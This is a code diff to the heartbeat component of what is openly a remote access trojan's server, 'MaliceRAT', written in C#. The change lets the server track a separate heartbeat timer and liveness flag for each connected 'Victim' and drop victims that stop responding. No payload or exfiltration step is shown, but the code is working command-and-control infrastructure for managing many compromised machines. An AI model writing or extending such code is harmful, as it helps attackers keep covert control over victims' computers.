@@ -3,6 +3,7 @@ using System.Net.Sockets;
 using System.Timers;
 using System.Web.Script.Serialization;
 using System.Threading.Tasks;
+using System.Collections.Generic;
 
 namespace MaliceRAT.RatServer.Features
 {
@@ -10,15 +11,14 @@ namespace MaliceRAT.RatServer.Features
     {
         #region Variables
         private double interval;
-        private Timer heartbeatTimer;
         private Server server;
-        private bool heartbeatReceived = true;
+        private Dictionary<Victim, Timer> heartbeatTimers = new Dictionary<Victim, Timer>();
+        private Dictionary<Victim, bool> heartbeatReceived = new Dictionary<Victim, bool>();
 
         public Heartbeat(double interval, Server server)
         {
             this.interval = interval;
             this.server = server;
-            heartbeatTimer = new Timer(interval);
             server.MessageReceived += HandleMessage;
         }
         #endregion
@@ -26,31 +26,39 @@ namespace MaliceRAT.RatServer.Features
         #region Methods
         public void StartHeartbeat(NetworkStream stream, Victim victim)
         {
-            heartbeatTimer.Elapsed += async (sender, e) =>
+            Timer timer = new Timer(interval);
+            timer.Elapsed += async (sender, e) =>
             {
-                if (!heartbeatReceived)
+                if (!heartbeatReceived[victim])
                 {
-                    heartbeatTimer.Stop();
+                    timer.Stop();
                     stream.Close();
                     server.OnClientDisconnected(victim);
                     return;
                 }
-                heartbeatReceived = false;
+                heartbeatReceived[victim] = false;
                 await SendHeartbeat(stream, victim);
             };
-            heartbeatTimer.Start();
+            timer.Start();
+            heartbeatTimers[victim] = timer;
+            heartbeatReceived[victim] = true;
         }
 
-        public void StopHeartbeat()
+        public void StopHeartbeat(Victim victim)
         {
-            heartbeatTimer.Stop();
+            if (heartbeatTimers.ContainsKey(victim))
+            {
+                heartbeatTimers[victim].Stop();
+                heartbeatTimers.Remove(victim);
+                heartbeatReceived.Remove(victim);
+            }
         }
 
         private void HandleMessage(Victim victim, dynamic message)
         {
-            if (message["type"] == "heartbeat")
+            if (message["type"] == "heartbeat" && heartbeatReceived.ContainsKey(victim))
             {
-                heartbeatReceived = true;
+                heartbeatReceived[victim] = true;
             }
         }
 
